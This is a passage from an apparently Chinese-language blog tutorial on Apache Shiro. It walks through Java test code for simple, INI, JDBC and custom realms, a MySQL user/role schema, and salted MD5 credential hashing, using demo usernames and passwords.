class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AuthenticationTest</span> </span>&#123;</span><br><span class="line">    SimpleAccountRealm simpleAccountRealm=<span class="keyword">new</span> SimpleAccountRealm();</span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        simpleAccountRealm.addAccount(<span class="string">"admin"</span>,<span class="string">"password"</span>,<span class="string">"admin"</span>,<span class="string">"user"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testAuthentication</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//构建SecurityManager环境</span></span><br><span class="line">        DefaultSecurityManager defaultSecurityManager=<span class="keyword">new</span> DefaultSecurityManager();</span><br><span class="line">        defaultSecurityManager.setRealm(simpleAccountRealm);</span><br><span class="line"></span><br><span class="line">         <span class="comment">//提交主题认证请求</span></span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject=SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">        UsernamePasswordToken usernamePasswordToken=<span class="keyword">new</span> UsernamePasswordToken(<span class="string">"admin"</span>,<span class="string">"password"</span>);</span><br><span class="line"></span><br><span class="line">        subject.login(usernamePasswordToken);</span><br><span class="line">        System.out.println(<span class="string">"isAuthenticated is:"</span> +subject.isAuthenticated());</span><br><span class="line">        subject.checkRoles(<span class="string">"admin"</span>,<span class="string">"user"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="IniRealm"><a href="#IniRealm" class="headerlink" title="IniRealm"></a>IniRealm</h2><p>user.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[users]</span><br><span class="line">admin=password,admin</span><br><span class="line">[roles]</span><br><span class="line">admin=user:delete,user:update</span><br></pre></td></tr></table></figure><p>IniRealmTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IniRealmTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testAuthentication</span><span class="params">()</span></span>&#123;</span><br><span class="line">        IniRealm iniRealm=<span class="keyword">new</span> IniRealm(<span class="string">"classpath:user.ini"</span>);</span><br><span class="line">        <span class="comment">//构建SecurityManager环境</span></span><br><span class="line">        DefaultSecurityManager defaultSecurityManager=<span class="keyword">new</span> DefaultSecurityManager();</span><br><span class="line">        defaultSecurityManager.setRealm(iniRealm);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//提交主题认证请求</span></span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject=SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">        UsernamePasswordToken usernamePasswordToken=<span class="keyword">new</span> UsernamePasswordToken(<span class="string">"admin"</span>,<span class="string">"password"</span>);</span><br><span class="line"></span><br><span class="line">        subject.login(usernamePasswordToken);</span><br><span class="line">        System.out.println(<span class="string">"isAuthenticated is:"</span> +subject.isAuthenticated());</span><br><span class="line">        subject.checkRole(<span class="string">"admin"</span>);</span><br><span class="line">        subject.checkPermissions(<span class="string">"user:delete"</span>,<span class="string">"user:update"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JdbcRealmTest"><a href="#JdbcRealmTest" class="headerlink" title="JdbcRealmTest"></a>JdbcRealmTest</h2><p>sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">NAMES</span> utf8mb4;</span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for roles_permissions</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`roles_permissions`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`roles_permissions`</span>  (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line">  <span class="string">`role_name`</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`permission`</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>) <span class="keyword">USING</span> BTREE</span><br><span class="line">) <span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8 <span class="keyword">COLLATE</span> = utf8_general_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of roles_permissions</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`roles_permissions`</span> <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">'system'</span>, <span class="string">'update'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for user_roles</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`user_roles`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`user_roles`</span>  (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line">  <span class="string">`username`</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`role_name`</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>) <span class="keyword">USING</span> BTREE</span><br><span class="line">) <span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8 <span class="keyword">COLLATE</span> = utf8_general_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of user_roles</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`user_roles`</span> <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">'admin'</span>, <span class="string">'system'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for users</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`users`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`users`</span>  (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`username`</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`password`</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`password_salt`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>) <span class="keyword">USING</span> BTREE</span><br><span class="line">) <span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span> AUTO_INCREMENT = <span class="number">2</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8 <span class="keyword">COLLATE</span> = utf8_general_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of users</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`users`</span> <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">'admin'</span>, <span class="string">'666'</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>pom.xml添加相关依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.1.45&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;druid&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.1.6&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>JdbcRealmTest.java</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public class JdbcRealmTest &#123;</span><br><span class="line">    DruidDataSource dataSource=new DruidDataSource();</span><br><span class="line">    &#123;</span><br><span class="line">        dataSource.setUrl(<span class="string">"jdbc:mysql://localhost:3306/test?useSSL=false"</span>);</span><br><span class="line">        dataSource.setUsername(<span class="string">"root"</span>);</span><br><span class="line">        dataSource.setPassword(<span class="string">"w0nd4rful"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @Test</span><br><span class="line">    public void <span class="function"><span class="title">testAuthentication</span></span>()&#123;</span><br><span class="line">        JdbcRealm jdbcRealm=new JdbcRealm();</span><br><span class="line">        jdbcRealm.setDataSource(dataSource);</span><br><span class="line">        jdbcRealm.setPermissionsLookupEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        //构建SecurityManager环境</span><br><span class="line">        DefaultSecurityManager defaultSecurityManager=new DefaultSecurityManager();</span><br><span class="line">        defaultSecurityManager.setRealm(jdbcRealm);</span><br><span class="line"></span><br><span class="line">        //提交主题认证请求</span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject=SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">        UsernamePasswordToken usernamePasswordToken=new UsernamePasswordToken(<span class="string">"admin"</span>,<span class="string">"666"</span>);</span><br><span class="line"></span><br><span class="line">        subject.login(usernamePasswordToken);</span><br><span class="line">        System.out.println(<span class="string">"isAuthenticated is:"</span> +subject.isAuthenticated());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自定义Realm"><a href="#自定义Realm" class="headerlink" title="自定义Realm"></a>自定义Realm</h2><p>CustomRealm.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomRealm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span> </span>&#123;</span><br><span class="line">    Map&lt;String,String &gt; userMap=<span class="keyword">new</span> HashMap&lt;String, String&gt;(<span class="number">16</span>);</span><br><span class="line">    &#123;</span><br><span class="line">        userMap.put(<span class="string">"admin"</span>,<span class="string">"password"</span>);</span><br><span class="line">        <span class="keyword">super</span>.setName(<span class="string">"customRealm"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> AuthorizationInfo <span class="title">doGetAuthorizationInfo</span><span class="params">(PrincipalCollection principalCollection)</span> </span>&#123;</span><br><span class="line">        String userName=(String)principalCollection.getPrimaryPrincipal();</span><br><span class="line">        Set&lt;String&gt; roles=getRolesByUserName(userName);</span><br><span class="line">        Set&lt;String&gt; permissions=getPermissionsByUserName(userName);</span><br><span class="line">        SimpleAuthorizationInfo authorizationInfo=<span class="keyword">new</span> SimpleAuthorizationInfo();</span><br><span class="line">        authorizationInfo.addRoles(roles);</span><br><span class="line">        authorizationInfo.addStringPermissions(permissions);</span><br><span class="line">        <span class="keyword">return</span> authorizationInfo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Set&lt;String&gt; <span class="title">getPermissionsByUserName</span><span class="params">(String userName)</span> </span>&#123;</span><br><span class="line">        Set&lt;String&gt; sets=<span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">        sets.add(<span class="string">"user:delete"</span>);</span><br><span class="line">        sets.add(<span class="string">"user:update"</span>);</span><br><span class="line">        <span class="keyword">return</span> sets;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> AuthenticationInfo <span class="title">doGetAuthenticationInfo</span><span class="params">(AuthenticationToken authenticationToken)</span> <span class="keyword">throws</span> AuthenticationException </span>&#123;</span><br><span class="line">        <span class="comment">//1.从主体传过来的信息中获取用户名</span></span><br><span class="line">        String userName=(String)authenticationToken.getPrincipal();</span><br><span class="line">        <span class="comment">//通过用户名到数据中获取数据</span></span><br><span class="line">        String password=getPasswordByUserName(userName);</span><br><span class="line">        <span class="keyword">if</span> (password==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>  <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        SimpleAuthenticationInfo authenticationInfo=<span class="keyword">new</span> SimpleAuthenticationInfo(userName,password,<span class="string">"customRealm"</span>);</span><br><span class="line">        <span class="keyword">return</span> authenticationInfo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//模拟数据库获取</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getPasswordByUserName</span><span class="params">(String userName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMap.get(userName);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> Set&lt;String&gt; <span class="title">getRolesByUserName</span><span class="params">(String UserName)</span></span>&#123;</span><br><span class="line">        Set&lt;String&gt; sets= <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">        sets.add(<span class="string">"admin"</span>);</span><br><span class="line">        sets.add(<span class="string">"users"</span>);</span><br><span class="line">        <span class="keyword">return</span> sets;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CustomRealmTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomRealmTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testAuthentication</span><span class="params">()</span></span>&#123;</span><br><span class="line">        CustomRealm customRealm=<span class="keyword">new</span> CustomRealm();</span><br><span class="line">        <span class="comment">//构建SecurityManager环境</span></span><br><span class="line">        DefaultSecurityManager defaultSecurityManager=<span class="keyword">new</span> DefaultSecurityManager();</span><br><span class="line">        defaultSecurityManager.setRealm(customRealm);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//提交主题认证请求</span></span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject=SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">        UsernamePasswordToken usernamePasswordToken=<span class="keyword">new</span> UsernamePasswordToken(<span class="string">"admin"</span>,<span class="string">"password"</span>);</span><br><span class="line"></span><br><span class="line">        subject.login(usernamePasswordToken);</span><br><span class="line">        System.out.println(<span class="string">"isAuthenticated is:"</span> +subject.isAuthenticated());</span><br><span class="line">        subject.checkRole(<span class="string">"admin"</span>);</span><br><span class="line">        subject.checkPermissions(<span class="string">"user:delete"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Shiro加密"><a href="#Shiro加密" class="headerlink" title="Shiro加密"></a>Shiro加密</h2><p>CustomRealm.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomRealm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span> </span>&#123;</span><br><span class="line">    Map&lt;String,String &gt; userMap=<span class="keyword">new</span> HashMap&lt;String, String&gt;(<span class="number">16</span>);</span><br><span class="line">    &#123;</span><br><span class="line">        userMap.put(<span class="string">"admin"</span>,getHash(<span class="string">"password"</span>));</span><br><span class="line">        <span class="keyword">super</span>.setName(<span class="string">"customRealm"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> AuthorizationInfo <span class="title">doGetAuthorizationInfo</span><span class="params">(PrincipalCollection principalCollection)</span> </span>&#123;</span><br><span class="line">        String userName=(String)principalCollection.getPrimaryPrincipal();</span><br><span class="line">        Set&lt;String&gt; roles=getRolesByUserName(userName);</span><br><span class="line">        Set&lt;String&gt; permissions=getPermissionsByUserName(userName);</span><br><span class="line">        SimpleAuthorizationInfo authorizationInfo=<span class="keyword">new</span> SimpleAuthorizationInfo();</span><br><span class="line">        authorizationInfo.addRoles(roles);</span><br><span class="line">        authorizationInfo.addStringPermissions(permissions);</span><br><span class="line">        <span class="keyword">return</span> authorizationInfo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> AuthenticationInfo <span class="title">doGetAuthenticationInfo</span><span class="params">(AuthenticationToken authenticationToken)</span> <span class="keyword">throws</span> AuthenticationException </span>&#123;</span><br><span class="line">        <span class="comment">//1.从主体传过来的信息中获取用户名</span></span><br><span class="line">        String userName=(String)authenticationToken.getPrincipal();</span><br><span class="line">        <span class="comment">//通过用户名到数据中获取数据</span></span><br><span class="line">        String password=getPasswordByUserName(userName);</span><br><span class="line">        <span class="keyword">if</span> (password==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>  <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        SimpleAuthenticationInfo authenticationInfo=<span class="keyword">new</span> SimpleAuthenticationInfo(userName,password,<span class="string">"customRealm"</span>);</span><br><span class="line">        authenticationInfo.setCredentialsSalt(ByteSource.Util.bytes(<span class="string">"ye1s"</span>));</span><br><span class="line">        <span class="keyword">return</span> authenticationInfo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//模拟数据库获取</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getPasswordByUserName</span><span class="params">(String userName)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMap.get(userName);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> Set&lt;String&gt; <span class="title">getRolesByUserName</span><span class="params">(String UserName)</span></span>&#123;</span><br><span class="line">        Set&lt;String&gt; sets= <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">        sets.add(<span class="string">"admin"</span>);</span><br><span class="line">        sets.add(<span class="string">"users"</span>);</span><br><span class="line">        <span class="keyword">return</span> sets;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> Set&lt;String&gt; <span class="title">getPermissionsByUserName</span><span class="params">(String userName)</span> </span>&#123;</span><br><span class="line">        Set&lt;String&gt; sets=<span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">        sets.add(<span class="string">"user:delete"</span>);</span><br><span class="line">        sets.add(<span class="string">"user:update"</span>);</span><br><span class="line">        <span class="keyword">return</span> sets;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getHash</span><span class="params">(String password)</span></span>&#123;</span><br><span class="line">        Md5Hash md5Hash=<span class="keyword">new</span> Md5Hash(<span class="string">"password"</span>,<span class="string">"ye1s"</span>);</span><br><span class="line">        <span class="keyword">return</span> md5Hash.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CustomRealmTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomRealmTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testAuthentication</span><span class="params">()</span></span>&#123;</span><br><span class="line">        CustomRealm customRealm=<span class="keyword">new</span> CustomRealm();</span><br><span class="line">        <span class="comment">//构建SecurityManager环境</span></span><br><span class="line">        DefaultSecurityManager defaultSecurityManager=<span class="keyword">new</span> DefaultSecurityManager();</span><br><span class="line">        defaultSecurityManager.setRealm(customRealm);</span><br><span class="line"></span><br><span class="line">        HashedCredentialsMatcher matcher=<span class="keyword">new</span> HashedCredentialsMatcher();</span><br><span class="line">        matcher.setHashAlgorithmName(<span class="string">"md5"</span>);</span><br><span class="line">        matcher.setHashIterations(<span class="number">1</span>);</span><br><span class="line">        